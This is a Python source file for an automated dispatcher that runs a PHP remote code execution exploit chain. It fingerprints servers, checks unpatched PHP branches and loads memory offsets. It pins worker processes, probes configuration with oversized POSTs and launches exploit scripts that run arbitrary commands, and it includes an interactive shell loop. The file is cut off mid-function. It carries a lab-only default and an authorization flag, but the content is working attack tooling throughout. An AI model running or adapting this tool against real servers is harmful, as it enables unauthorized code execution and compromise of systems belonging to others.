#!/usr/bin/env python3
"""
php2shell_auto.py — version-aware dispatcher for the PHP2Shell RCE chain.

Flow
----
1. Fingerprint the target (X-Powered-By, Server, PHP version in the body).
2. Reject versions at or above the fixed release.
3. Route by SAPI: nginx (PHP-FPM) targets go to the FPM chain
   (tools/php2shell_fpm.py, local lab / oracle mode); Apache targets
   continue with the upstream progress-cache chain.
4. Compare the target OS with the profile (Debian/Ubuntu/Fedora/Alpine...).
5. Load the verified build profile and take the libphp offsets and heap
   parameters from it.
6. Run the chain, sweeping typical memory limits unless one is supplied.
7. Print a Wiz-style staged log and a result box.

Proof handling is automatic:
  - local target: read the proof file written to the mounted /out;
  - remote target with a relative output path (`id>p1`): fetch /p1;
  - explicit --fetch / --no-fetch overrides the default.

Authorized testing only.
"""

from __future__ import annotations

import argparse
import contextlib
import glob
import ipaddress
import json
import os
import re
import socket
import ssl
import subprocess
import sys
import urllib.parse

from php2shell_paths import default_repo_dir
from php2shell_ui import UI
from php2shell_upstream import patch_cookie_decode, patch_params, patch_tls
from php2shell_vessel import pads_to_spec

FIXED = {"8.2": 35, "8.3": 36, "8.4": 27, "8.5": 12}
HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
DEFAULT_PROFILES = os.path.join(ROOT, "profiles")


# ---------------------------------------------------------------------------
# fingerprint and profile lookup
# ---------------------------------------------------------------------------
def http_head(url: str, timeout: float = 8.0):
    u = urllib.parse.urlsplit(url if "://" in url else "http://" + url)
    host = u.hostname or ""
    port = u.port or (443 if u.scheme == "https" else 80)
    path = u.path or "/"
    import ssl
    s = socket.create_connection((host, port), timeout=timeout)
    if u.scheme == "https":
        s = ssl._create_unverified_context().wrap_socket(s, server_hostname=host)
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: php2shell-auto/2.0\r\n"
           f"Connection: close\r\n\r\n").encode()
    s.sendall(req)
    data = b""
    try:
        while len(data) < 65536:
            chunk = s.recv(65536)
            if not chunk:
                break
            data += chunk
    except OSError:
        pass
    s.close()
    head, _, body = data.partition(b"\r\n\r\n")
    headers = {}
    for line in head.split(b"\r\n")[1:]:
        if b":" in line:
            k, _, v = line.partition(b":")
            headers.setdefault(k.decode("latin-1").strip().lower(), v.decode("latin-1").strip())
    return headers, body


def fingerprint(url: str) -> tuple[str, str, str]:
    headers, body = http_head(url)
    server = headers.get("server", "?")
    powered = headers.get("x-powered-by", "")
    m = re.search(r"PHP/(\d+\.\d+\.\d+)", powered)
    if m:
        version = m.group(1)
    else:
        m = re.search(rb"PHP/(\d+\.\d+\.\d+)", body)
        version = m.group(1).decode() if m else ""
    return version, server, powered


def detect_distro(server: str) -> str | None:
    text = (server or "").lower()
    for key in ("fedora", "debian", "ubuntu", "alpine", "centos",
                "red hat", "rhel", "amazon linux", "suse", "arch linux"):
        if key in text:
            return key
    return None


def normalize_distro(value: str) -> str | None:
    text = (value or "").lower()
    if any(x in text for x in ("debian", "bookworm", "bullseye", "buster", "trixie")):
        return "debian"
    for key in ("ubuntu", "fedora", "alpine", "centos", "rhel", "red hat",
                "amazon linux", "suse", "arch linux"):
        if key in text:
            return key
    return None


def classify(version: str):
    m = re.fullmatch(r"(\d+)\.(\d+)\.(\d+)", version or "")
    if not m:
        return None
    major, minor, patch = map(int, m.groups())
    branch = f"{major}.{minor}"
    fixed = FIXED.get(branch)
    return branch, fixed, (patch >= fixed if fixed else None)


def detect_sapi(server: str) -> str:
    """Best-effort SAPI guess from the Server header: nginx in front of
    PHP-FPM is the common non-Apache shape."""
    text = (server or "").lower()
    if "apache" in text:
        return "apache"
    if "nginx" in text:
        return "fpm"
    return "unknown"


def proof_path_from_command(command: str, default: str = "out/p1") -> str:
    if ">" in command:
        tail = command.rsplit(">", 1)[1].strip()
        if tail:
            return tail.lstrip("/")
    return default


def run_fpm_chain(ui, args, version: str) -> int:
    """Route an nginx+PHP-FPM target to tools/php2shell_fpm.py.

    The FPM chain (stale BG(unserialize) after a post-RINIT OOM) still needs
    the lab builder/session endpoints and, for `endgame`, the local /proc
    oracle.  `no-oracle` can leak the chunk/PIE bases over HTTP, but the
    shipped dispatcher remains loopback-only."""
    import php2shell_fpm as fpm

    host = urllib.parse.urlsplit(
        args.target if "://" in args.target else "http://" + args.target
    ).hostname or ""
    if not is_loopback(host):
        ui.crit("the FPM chain needs local /proc oracle access (lab mode)")
        ui.info("remote FPM still requires the builder/session endpoints (lab-only)")
        ui.result(False, "FPM REMOTE UNSUPPORTED", f"PHP {version} behind a non-loopback front")
        return 3

    base = args.target if "://" in args.target else "http://" + args.target
    builder = args.builder or base
    # the auto defaults (id>/out/p1) target the Apache chain's mounted /out;
    # the FPM chain runs with the pool chdir as cwd and writes relative paths
    command = args.command
    if command in ("id>/out/p1", "id>p1"):
        command = "id>out/p1"
    proof_file = args.proof_file or proof_path_from_command(command)

    ui.stage("FPM CHAIN", f"PHP {version} via {base}")
    ui.info(f"builder: {builder}")
    ui.info(f"command: {command}  (worker cwd = pool chdir)")
    ui.info("calibration oracle: /proc/<worker>/mem (local lab)")

    if args.dry_run:
        cmd = [sys.executable, os.path.join(HERE, "php2shell_fpm.py"),
               "--base", base, "--builder", builder, "--version", version,
               "--command", command, "--proof-file", proof_file]
        if args.allow_remote:
            cmd.append("--allow-remote")
        cmd.append("endgame")
        ui.command(cmd)
        return 0

    ns = argparse.Namespace(
        base=base,
        builder=builder,
        version=version,
        command=command,
        proof_file=proof_file,
        size=4 << 20,
    )
    rc = fpm.cmd_endgame(ns)
    ui.result(rc == 0, "RCE" if rc == 0 else "FAILED",
              f"PHP {version} fpm chain" if rc == 0 else "no proof file")
    return rc


def is_loopback(host: str) -> bool:
    try:
        infos = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
    except socket.gaierror:
        return False
    if not infos:
        return False
    for info in infos:
        try:
            if not ipaddress.ip_address(info[4][0]).is_loopback:
                return False
        except ValueError:
            return False
    return True


def detect_arch(container: str) -> str | None:
    """Read the architecture of a local container."""
    try:
        result = subprocess.run(["docker", "exec", container, "uname", "-m"],
                                capture_output=True, text=True, timeout=10)
    except (OSError, subprocess.SubprocessError):
        return None
    return {"aarch64": "aarch64", "arm64": "aarch64",
            "x86_64": "amd64", "amd64": "amd64"}.get(result.stdout.strip().lower())


def container_for_port(port: int) -> str | None:
    """Find the local container publishing 127.0.0.1:<port>."""
    try:
        result = subprocess.run(["docker", "ps", "--format", "{{.Names}}\t{{.Ports}}"],
                                capture_output=True, text=True, timeout=10)
    except (OSError, subprocess.SubprocessError):
        return None
    for line in result.stdout.splitlines():
        name, _, ports = line.partition("\t")
        if f":{port}->" in ports:
            return name
    return None


def load_profiles(directory: str):
    profiles = []
    for path in sorted(glob.glob(os.path.join(directory, "*.json"))):
        try:
            with open(path, encoding="utf-8") as fh:
                data = json.load(fh)
            if not isinstance(data, dict) or "php_version" not in data:
                continue
            data["_path"] = path
            profiles.append(data)
        except (OSError, ValueError) as exc:
            print(f"[!] ignoring {path}: {exc}", file=sys.stderr)
    return profiles


def remote_arch_required(remote: bool, arch: str | None, profile: str | None) -> bool:
    """Remote targets cannot be fingerprinted for CPU architecture."""
    return bool(remote and not arch and not profile)


def select(profiles, version: str, branch: str, arch: str | None = None):
    def fits(profile):
        return arch is None or profile.get("arch") == arch
    exact = [p for p in profiles if p.get("php_version") == version and fits(p)]
    if exact:
        return exact[0], "exact"
    same_branch = [p for p in profiles if p.get("branch") == branch and fits(p)]
    if same_branch:
        return same_branch[0], "branch-only"
    return None, "none"


# ---------------------------------------------------------------------------
# upstream patches and parameters
# ---------------------------------------------------------------------------
def local_out_dir(args) -> str | None:
    if args.allow_remote:
        return None
    source = container_out(args.container)
    if source:
        return source
    if args.proof_file:
        return os.path.dirname(args.proof_file) or "."
    return None


def stage_script(outdir: str, body: str) -> None:
    wrapper = "{ " + body.strip() + " ; } > /out/o 2>&1\n"
    path = os.path.join(outdir, "c")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(wrapper)
    os.chmod(path, 0o755)


def interactive_loop(args, profile, outdir, ui: UI) -> int:
    huge = args.huge_mb or oom_for(args.memory_limit_mb or 8, profile)
    ui.warn("interactive mode: every command re-runs the full chain (~1 min each)")
    args.command = "sh</out/c"
    while True:
        try:
            line = input("php2shell> ")
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if line.strip().lower() in ("exit", "quit"):
            break
        if not line.strip():
            continue
        stage_script(outdir, line)
        output = os.path.join(outdir, "o")
        with contextlib.suppress(OSError):
            os.unlink(output)
        rc = run_upstream(args, profile, output, huge, ui, stream=False)
        if os.path.isfile(output):
            with open(output, encoding="utf-8", errors="replace") as handle:
                print(handle.read().rstrip())
        else:
            ui.warn(f"no output (chain exit {rc})")
    return 0


def oom_for(limit: int, profile: dict) -> int:
    if limit == 8 and profile.get("oom_mb"):
        return int(profile["oom_mb"])
    return limit + 12


# A correct leak is an mmap'd mapping: 0x7f... on amd64, 0xffff... on aarch64.
# Anything below 1 TiB is a small integer or an un-relocated offset that the
# upstream range filter accepts but that silently corrupts every later stage.
MIN_MMAP_ADDR = 0x10000000000


def implausible_leak(sink: dict) -> str | None:
    """The leaked value, when it cannot be a real heap/module mapping."""
    value = sink.get("chunk_base") or sink.get("libphp_base")
    if value is not None and 0 < value < MIN_MMAP_ADDR:
        return hex(value)
    return None


# ---------------------------------------------------------------------------
# proof/fetch resolution
# ---------------------------------------------------------------------------
def output_path(command: str) -> str | None:
    m = re.search(r">\s*([^\s;&|]+)", command or "")
    return m.group(1) if m else None


def resolve_fetch(args, command: str) -> str:
    if args.no_fetch:
        return ""
    if args.fetch:
        return args.fetch
    if not args.allow_remote:
        return ""
    path = output_path(command)
    if path and not path.startswith("/"):
        return "/" + path
    return ""


def container_out(container: str) -> str | None:
    """Host path mounted at /out in a local container, if any."""
    try:
        result = subprocess.run(
            ["docker", "inspect", "-f",
             '{{range .Mounts}}{{if eq .Destination "/out"}}{{.Source}}{{end}}{{end}}',
             container],
            capture_output=True, text=True, timeout=10)
        source = result.stdout.strip()
        return source or None
    except (OSError, subprocess.SubprocessError):
        return None


def resolve_proof(args, fetch: str) -> str:
    if args.proof_file is not None:
        return args.proof_file
    if args.allow_remote:
        return ""
    source = container_out(args.container)
    if source:
        return os.path.join(source, "p1")
    return os.path.join(args.repo_dir, "out", "p1")


# ---------------------------------------------------------------------------
# execution
# ---------------------------------------------------------------------------
class WorkerPins:
    """Hold N-1 workers with idle keep-alive connections, leaving one free."""

    def __init__(self, url: str, count: int):
        u = urllib.parse.urlsplit(url if "://" in url else "http://" + url)
        host = u.hostname or ""
        port = u.port or (443 if u.scheme == "https" else 80)
        path = u.path or "/"
        self.socks = []
        for _ in range(count):
            s = socket.create_connection((host, port), timeout=10)
            if u.scheme == "https":
                s = ssl._create_unverified_context().wrap_socket(s, server_hostname=host)
            req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                   f"User-Agent: php2shell-pin/1.0\r\nConnection: keep-alive\r\n\r\n").encode()
            s.sendall(req)
            s.settimeout(3)
            with contextlib.suppress(OSError):
                s.recv(65536)
            self.socks.append(s)

    @classmethod
    def from_socks(cls, socks):
        obj = cls.__new__(cls)
        obj.socks = socks
        return obj

    @classmethod
    def auto_remote(cls, url: str, max_pins: int = 32):
        """Saturate the worker pool with keep-alive connections, then free one.

        Without access to the server we cannot count workers; we keep opening
        connections until a request stops being answered (all workers busy) and
        then release one connection for the chain.
        """
        u = urllib.parse.urlsplit(url if "://" in url else "http://" + url)
        host = u.hostname or ""
        port = u.port or (443 if u.scheme == "https" else 80)
        path = u.path or "/"
        pins = []
        for _ in range(max_pins):
            s = None
            try:
                s = socket.create_connection((host, port), timeout=3)
                if u.scheme == "https":
                    s = ssl._create_unverified_context().wrap_socket(s, server_hostname=host)
                req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                       f"User-Agent: php2shell-pin/1.0\r\nConnection: keep-alive\r\n\r\n").encode()
                s.sendall(req)
                s.settimeout(2)
                data = s.recv(65536)
            except TimeoutError:
                if s is not None:
                    with contextlib.suppress(OSError):
                        s.close()
                break
            except OSError:
                if s is not None:
                    with contextlib.suppress(OSError):
                        s.close()
                break
            if not data:
                with contextlib.suppress(OSError):
                    s.close()
                break
            head = data.split(b"\r\n\r\n", 1)[0].lower()
            if b"connection: close" in head:
                with contextlib.suppress(OSError):
                    s.close()
                for p in pins:
                    p.close()
                return None
            pins.append(s)
        if len(pins) <= 1:
            for p in pins:
                p.close()
            return None
        pins.pop().close()
        return cls.from_socks(pins)

    def close(self) -> None:
        for s in self.socks:
            with contextlib.suppress(OSError):
                s.close()


def parse_probe_response(data: bytes) -> dict:
    """Read the target configuration out of one probe response.

    Request-startup diagnostics only render with display_errors=On, which is
    exactly the mode the stage-1 leak needs: the OOM fatal reveals
    memory_limit, the body-size warning reveals post_max_size, and either
    message doubles as proof that diagnostics are rendered at all.
    """
    out = {"memory_limit": None, "post_max_size": None,
           "diagnostics": False, "rejected": False}
    m = re.search(rb"Allowed memory size of (\d+) bytes", data)
    if m:
        out["memory_limit"] = max(1, int(m.group(1)) // (1024 * 1024))
        out["diagnostics"] = True
        return out
    m = re.search(rb"exceeds the limit of (\d+) bytes", data)
    if m:
        out["post_max_size"] = int(m.group(1))
        out["diagnostics"] = True
        return out
    if b"413" in data.split(b"\r\n", 1)[0] or b"Request Entity Too Large" in data:
        out["rejected"] = True
        return out
    for needle in (b"Fatal error:", b"Warning:", b"Deprecated:"):
        if needle in data:
            out["diagnostics"] = True
            break
    return out


def probe_config(args, ui: UI) -> dict:
    """One-shot configuration probe with the same oversized POSTs that used to
    only reveal memory_limit. The responses additionally reveal post_max_size
    (a value smaller than the OOM body silently blocks the whole chain) and
    whether request-startup diagnostics are rendered (display_errors)."""
    u = urllib.parse.urlsplit(args.target if "://" in args.target else "http://" + args.target)
    host = u.hostname or ""
    port = u.port or (443 if u.scheme == "https" else 80)
    path = u.path or "/"
    import ssl
    result = {"memory_limit": None, "post_max_size": None, "display_errors": None}
    rejected = False
    for mb in (16, 64, 256):
        body = b"big=" + b"A" * (mb * 1024 * 1024)
        ui.stage("PROBE", f"config probe: {mb} MiB body")
        try:
            s = socket.create_connection((host, port), timeout=30)
            if u.scheme == "https":
                s = ssl._create_unverified_context().wrap_socket(s, server_hostname=host)
            req = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                   f"User-Agent: php2shell-auto/2.0\r\n"
                   f"Content-Type: application/x-www-form-urlencoded\r\n"
                   f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
            s.sendall(req)
            s.sendall(body)
            s.settimeout(30)
            data = b""
            while len(data) < 65536:
                chunk = s.recv(65536)
                if not chunk:
                    break
                data += chunk
            s.close()
        except OSError:
            break
        parsed = parse_probe_response(data)
        if parsed["diagnostics"]:
            result["display_errors"] = True
        if parsed["memory_limit"]:
            result["memory_limit"] = parsed["memory_limit"]
            break
        if parsed["post_max_size"]:
            result["post_max_size"] = parsed["post_max_size"]
            break
        if parsed["rejected"]:
            rejected = True
            break
    if result["memory_limit"]:
        ui.ok(f"detected memory_limit={result['memory_limit']}M")
    if result["post_max_size"]:
        ui.ok(f"detected post_max_size={result['post_max_size'] // (1024 * 1024)}M")
    if result["display_errors"]:
        ui.ok("display_errors=On (request-startup diagnostics are rendered)")
    elif rejected:
        ui.warn("body rejected by the server (413); target config unknown")
    else:
        ui.warn("no request-startup diagnostics seen; display_errors may be Off "
                "(stage 1 depends on it)")
    return result


def _capture_leaks(text: str, sink: dict) -> None:
    """Collect the leaked bases from upstream output lines."""
    for key, label in (("chunk_base", "chunk base"), ("libphp_base", "libphp base")):
        m = re.search(label + r" = (0x[0-9a-fA-F]+)", text)
        if m:
            sink[key] = int(m.group(1), 16)


def run_upstream(args, profile, proof, huge_mb, ui: UI, stream: bool = True,
                 sink: dict | None = None) -> int:
    """Run the upstream exploit; sink (optional) collects the leaked bases."""
    repo = args.repo_dir
    if not os.path.isfile(os.path.join(repo, "exploit.py")):
        ui.crit(f"{repo}/exploit.py not found; clone 9bie/php2shell-bypass-aslr-exp")
        return 4
    lib = profile.get("libphp") or {}
    if not lib.get("zif_system") or not lib.get("zval_ptr_dtor"):
        ui.crit("profile has no libphp offsets")
        return 3
    stages = profile.get("stages") or {}
    if stages.get("stage3_mode") == "vessel":
        if not lib.get("htdata"):
            ui.crit("vessel profile has no htdata offset")
            return 3
        return run_vessel(args, profile, proof, huge_mb, ui, stream, sink)
    cmd = [sys.executable, os.path.join(repo, "exploit.py"),
           "-u", args.target, "-c", args.command,
           "--profile", profile.get("upstream_profile", "bookworm"),
           "--proof-file", proof,
           "--zif-offset", str(lib["zif_system"]),
           "--dtor-offset", str(lib["zval_ptr_dtor"])]
    if lib.get("htdata"):
        cmd += ["--htdata-offset", str(lib["htdata"])]
    if args.fetch:
        cmd += ["--fetch", args.fetch]
    if huge_mb:
        cmd += ["--huge-mb", str(huge_mb)]
    if args.retries is not None:
        cmd += ["--retries", str(args.retries)]
    if args.no_pre_rotate:
        cmd += ["--no-pre-rotate"]
    if args.no_retry_rotate:
        cmd += ["--no-retry-rotate"]
    if args.allow_remote:
        cmd += ["--no-auto-offsets"]
    else:
        cmd += ["--docker-container", args.container]

    if args.dry_run:
        ui.command(cmd)
        return 0

    env = os.environ.copy()
    for key, env_key in (("stage1_n", "P2S_STAGE1_N"),
                         ("stage1_forge_len", "P2S_FORGE_LEN"),
                         ("stage2_t", "P2S_STAGE2_T"),
                         ("stage2_v", "P2S_STAGE2_V")):
        if stages.get(key) is not None:
            env[env_key] = str(stages[key])
    pads = stages.get("stage3_pads")
    if pads:
        env["P2S_STAGE3_PADS"] = ",".join(f"{a}:{b}" for a, b in pads)
    stage3_cookie = stages.get("stage3_cookie")
    if stage3_cookie is not None:
        env["P2S_STAGE3_COOKIE"] = "1" if stage3_cookie else "0"
    for key, env_key in (("stage3_wfields", "P2S_STAGE3_WFIELDS"),
                         ("stage3_fake_len", "P2S_STAGE3_FAKE_LEN"),
                         ("stage3_fakes", "P2S_STAGE3_FAKES"),
                         ("stage3_b_name_len", "P2S_STAGE3_B_NAME_LEN")):
        if stages.get(key) is not None:
            env[env_key] = str(stages[key])

    return _run_exploit_cmd(cmd, ui, stream, sink, env)


def run_vessel(args, profile, proof, huge_mb, ui: UI, stream: bool = True,
               sink: dict | None = None) -> int:
    """Run the vessel stage-3 chain (early-8.5 layouts).

    Same leaks as upstream; stage 3 steers the dangling reference onto B2's
    blob page instead of landing a carrier string on it
    (tools/php2shell_vessel.py has the technique).
    """
    lib = profile.get("libphp") or {}
    stages = profile.get("stages") or {}
    cmd = [sys.executable, os.path.join(HERE, "php2shell_vessel.py"),
           "-u", args.target, "-c", args.command,
           "--repo-dir", args.repo_dir,
           "--proof-file", proof,
           "--zif-offset", str(lib["zif_system"]),
           "--dtor-offset", str(lib["zval_ptr_dtor"]),
           "--htdata-offset", str(lib["htdata"])]
    for key, arg in (("stage1_n", "--stage1-n"),
                     ("stage1_forge_len", "--forge-len"),
                     ("stage2_t", "--stage2-t"),
                     ("stage2_v", "--stage2-v"),
                     ("stage3_early", "--early"),
                     ("stage3_blobs", "--blobs"),
                     ("stage3_vessel_index", "--vessel-index")):
        if stages.get(key) is not None:
            cmd += [arg, str(stages[key])]
    if stages.get("stage3_pads"):
        cmd += ["--pad", pads_to_spec(stages["stage3_pads"])]
    if args.fetch:
        cmd += ["--fetch", args.fetch]
    if huge_mb:
        cmd += ["--huge-mb", str(huge_mb)]
    if args.retries is not None:
        cmd += ["--retries", str(args.retries)]
    if args.no_pre_rotate:
        cmd += ["--no-pre-rotate"]
    if args.no_retry_rotate:
        cmd += ["--no-retry-rotate"]
    if args.allow_remote:
        cmd += ["--allow-remote"]
    if args.insecure:
        cmd += ["--insecure"]

    if args.dry_run:
        ui.command(cmd)
        return 0
    return _run_exploit_cmd(cmd, ui, stream, sink)


def _run_exploit_cmd(cmd, ui: UI, stream: bool, sink: dict | None = None,
                     env: dict | None = None) -> int:
    """Stream an exploit subprocess, optionally collecting leaked bases."""
    if not stream:
        result = subprocess.run(cmd, capture_output=True, text=True, env=env)
        if sink is not None:
            _capture_leaks(result.stdout, sink)
        if result.returncode != 0:
            tail = (result.stdout + result.stderr).strip().splitlines()[-4:]
            for line in tail:
                ui.upstream(line)
        return result.returncode

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, env=env, bufsize=1)
    assert proc.stdout is not None
    for line in proc.stdout:
        ui.upstream(line.rstrip())
        if sink is not None:
            _capture_leaks(line, sink)
    return proc.wait()


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Version-aware PHP2Shell RCE dispatcher.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    ap.add_argument("-u", "--target", required=False)
    ap.add_argument("-c", "--command", default=None,
                    help="command to run (default: id>/out/p1 local, id>p1 remote)")
    ap.add_argument("--repo-dir", default=default_repo_dir())
    ap.add_argument("--container", default="php2shell-target")
    ap.add_argument("--profiles", default=DEFAULT_PROFILES)
    ap.add_argument("--catalog", default=os.path.join(ROOT, "catalog", "vulnerable.json"))
    ap.add_argument("--proof-file", default=None,
                    help="local proof file; '' disables local read")
    ap.add_argument("--fetch", default=None,
                    help="remote proof path; auto-derived from a relative output")
    ap.add_argument("--no-fetch", action="store_true", help="disable the automatic fetch")
    ap.add_argument("--list", action="store_true", help="list profiles and exit")
    ap.add_argument("--assess", action="store_true",
                    help="run the exposure/leak assessment when no RCE profile exists")
    ap.add_argument("--allow-remote", action="store_true")
    ap.add_argument("--insecure", action="store_true",
                    help="disable TLS verification (lab certificates)")
    ap.add_argument("--php-version", default=None,
                    help="assume this PHP version when the server hides it (e.g. 8.4.26)")
    ap.add_argument("--force-build", action="store_true",
                    help="run even if the target OS does not match the profile")
    ap.add_argument("--memory-limit-mb", type=int, default=None,
                    help="target memory_limit in MiB")
    ap.add_argument("--huge-mb", type=int, default=None,
                    help="explicit OOM field size in MiB")
    ap.add_argument("--no-probe", action="store_true",
                    help="do not probe memory_limit/post_max_size/display_errors")
    ap.add_argument("--retries", type=int, default=None,
                    help="upstream attempts per stage (default 3; stage 3 uses +2)")
    ap.add_argument("--no-pre-rotate", action="store_true",
                    help="skip the initial worker rotation")
    ap.add_argument("--no-retry-rotate", action="store_true",
                    help="do not rotate between failed stage attempts")
    ap.add_argument("--no-auto-memory", action="store_true",
                    help="do not sweep the typical memory limits")
    ap.add_argument("--dry-run", action="store_true",
                    help="show the selected profile and command, do not run")
    ap.add_argument("--script", default=None,
                    help="local script to stage in /out/c and run with sh</out/c")
    ap.add_argument("--interactive", action="store_true",
                    help="interactive command loop (local labs; slow: one chain run per command)")
    ap.add_argument("--pin-workers", default=None,
                    help="hold N-1 workers with keep-alive ('auto' for a local container; "
                         "default: auto for loopback, off for remote)")
    ap.add_argument("--no-pin-workers", action="store_true",
                    help="disable worker pinning")
    ap.add_argument("--pin-max", type=int, default=32,
                    help="max keep-alive connections for remote auto-pinning")
    ap.add_argument("--arch", choices=("aarch64", "amd64"), default=None,
                    help="CPU architecture; required for remote targets, auto-detected locally")
    ap.add_argument("--profile", default=None,
                    help="force a profile by name/path substring (needed when a version has several builds)")
    ap.add_argument("--sapi", choices=("auto", "apache", "fpm"), default="auto",
                    help="override the SAPI detection (fpm = nginx + PHP-FPM chain)")
    ap.add_argument("--builder", default=None,
                    help="FPM chain builder endpoint (default: the target itself)")
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()

    profiles = load_profiles(args.profiles)
    catalog = {}
    try:
        with open(args.catalog, encoding="utf-8") as fh:
            catalog = json.load(fh)
    except (OSError, ValueError):
        pass
    if not args.target and not args.list:
        ap.error("-u/--target is required")
    if args.list:
        for p in profiles:
            print(f"{p.get('php_version'):10} rce={str(p.get('rce')):5} {p.get('name')}")
        if catalog:
            print("\ncatalog coverage:")
            for b in catalog.get("branches", []):
                fixed = b.get("fixed_in") or "no official fix"
                print(f"  {b['branch']:4} affected={b['affected']:16} fixed_in={fixed}")
        return 0

    parsed = urllib.parse.urlsplit(args.target if "://" in args.target else "http://" + args.target)
    host = parsed.hostname or ""
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    loopback = is_loopback(host)
    if not loopback and not args.allow_remote:
        ap.error("non-loopback target requires --allow-remote (written authorization)")
    remote = not loopback
    args.allow_remote = remote
    if loopback and args.container == "php2shell-target":
        detected = container_for_port(port)
        if detected:
            args.container = detected
    args.command = args.command or ("id>p1" if remote else "id>/out/p1")
    args.fetch = resolve_fetch(args, args.command)
    proof = resolve_proof(args, args.fetch)

    ui = UI(color=not args.no_color)
    ui.banner()
    ui.chain("01/01", "automatic target detection / fixed command proof")
    ui.stage("DISCOVER", args.target)
    if args.arch is None and not remote:
        detected_arch = detect_arch(args.container)
        if detected_arch:
            args.arch = detected_arch
            ui.info(f"detected architecture: {detected_arch}")
    if remote_arch_required(remote, args.arch, args.profile):
        ui.crit("remote target: CPU architecture cannot be detected")
        ui.info("pass --arch aarch64|amd64 (and --php-version if needed) or --profile NAME")
        ui.result(False, "ARCH REQUIRED", "remote target without --arch/--profile")
        return 3

    version, server, powered = fingerprint(args.target)
    if args.php_version:
        if version and version != args.php_version:
            ui.warn(f"server reports PHP {version}; using {args.php_version} as requested")
        else:
            ui.info(f"using supplied PHP version {args.php_version}")
        version = args.php_version
    if not version:
        ui.crit("cannot determine the PHP version; pass --php-version X.Y.Z or --profile NAME")
        ui.result(False, "NOT CONFIRMED", "PHP version not identified")
        return 3
    ui.ok(f"PHP {version}  ·  {server}")
    if not powered:
        ui.warn("no X-Powered-By header (expose_php=Off): the startup heap differs and "
                "the profile's stage-3 pads were calibrated with expose_php=On")

    cls = classify(version)
    if not cls:
        ui.crit("unparsable PHP version")
        ui.result(False, "NOT CONFIRMED", version)
        return 3
    branch, fixed, patched = cls
    if fixed is not None and patched:
        ui.ok(f"fixed release: PHP {version} >= {branch}.{fixed}")
        ui.result(False, "TARGET PATCHED", f"PHP {version} is at or above {branch}.{fixed}")
        return 0
    if fixed is None:
        ui.warn(f"branch {branch} is outside the fix matrix (EOL/unpatched)")

    sapi = args.sapi if args.sapi != "auto" else detect_sapi(server)
    if sapi == "fpm":
        ui.info(f"SAPI: fpm (server header {server!r}); using the FPM chain")
        return run_fpm_chain(ui, args, version)

    if args.profile:
        matches = [p for p in profiles
                   if args.profile in p.get("name", "") or args.profile in p.get("_path", "")]
        if len(matches) == 1:
            profile, how = matches[0], "forced"
        elif len(matches) > 1:
            ui.crit(f"--profile {args.profile!r} matches {len(matches)} profiles; be more specific")
            return 3
        else:
            ui.crit(f"no profile matches --profile {args.profile!r}")
            return 3
    else:
        exact = [p for p in profiles
                 if p.get("php_version") == version
                 and (args.arch is None or p.get("arch") == args.arch)]
        if len(exact) > 1:
            names = ", ".join(p.get("name", "?") for p in exact)
            ui.crit(f"multiple builds for PHP {version}: {names}")
            ui.info("pass --arch aarch64|amd64 or --profile NAME")
            return 3
        profile, how = select(profiles, version, branch, args.arch)
    if profile is None:
        entry = next((b for b in catalog.get("branches", []) if b.get("branch") == branch), None)
        if entry:
            fixed_txt = entry.get("fixed_in") or "no official fix (EOL)"
            ui.info(f"catalog: branch {branch}, affected {entry.get('affected')}, fixed in {fixed_txt}")
        ui.crit(f"no profile for PHP {version} ({branch})")
        ui.info("a profile needs libphp offsets plus stage1_n/forge/stage2_t/v/stage3_pads")
        ui.info("generate one with tools/php2shell_calibrate.py on a replica")
        ui.result(False, "NO PROFILE", f"PHP {version} ({branch})")
        return 3
    if how == "branch-only":
        ui.warn(f"no exact profile for {version}; using {profile['php_version']} from the branch")
        if profile.get("rce"):
            ui.warn("refusing to run an RCE profile against a different build")
            profile = dict(profile)
            profile["rce"] = False
            profile["_refusal"] = (f"no verified profile for PHP {version}; refusing to "
                                   f"re-use the {profile['php_version']} RCE profile "
                                   f"against a different build")

    target_distro = detect_distro(server)
    profile_distro = normalize_distro(profile.get("distro") or profile.get("name", ""))
    if target_distro:
        ui.info(f"target OS: {target_distro}  ·  profile OS: {profile_distro or 'unknown'}")
    if (target_distro and profile_distro and target_distro != profile_distro
            and not args.force_build):
        ui.crit(f"target looks like {target_distro}, profile is {profile_distro}")
        ui.result(False, "BUILD MISMATCH", f"{profile['name']} is not a {target_distro} profile")
        return 3

    ui.stage("PREFLIGHT", profile["name"])
    if loopback:
        ui.info(f"local container: {args.container}")
    lib = profile.get("libphp") or {}
    ui.info(f"offsets: zif={lib.get('zif_system')} dtor={lib.get('zval_ptr_dtor')} "
            f"htdata={lib.get('htdata')}")
    ui.info(f"command: {args.command}")
    if args.fetch:
        ui.info(f"proof fetch: {args.fetch}")
    elif args.allow_remote and not proof:
        ui.warn("remote target without a fetch path; the command runs blind")

    if not profile.get("rce"):
        if profile.get("_refusal"):
            ui.crit(profile["_refusal"])
        else:
            ui.crit("profile has no verified RCE stage")
            for key in ("status", "measured"):
                if profile.get(key):
                    ui.info(f"{key}: {profile[key]}")
        if args.assess:
            tool = os.path.join(HERE, "php2shell_assess.py")
            if os.path.isfile(tool):
                ui.stage("ASSESS", "running exposure/leak assessment")
                return subprocess.call([sys.executable, tool, "--target", args.target])
        detail = (f"no verified profile for PHP {version}" if profile.get("_refusal")
                  else profile.get("status", profile["name"]))
        ui.result(False, "NO VERIFIED RCE", detail)
        return 2

    patch_params(args.repo_dir)
    patch_cookie_decode(args.repo_dir)
    if args.insecure:
        patch_tls(args.repo_dir)

    outdir = local_out_dir(args)
    if outdir:
        try:
            mode = os.stat(outdir).st_mode & 0o777
            if not (mode & 0o002):
                ui.warn(f"{outdir} is not world-writable; run chmod 777 if the proof is missing")
        except OSError:
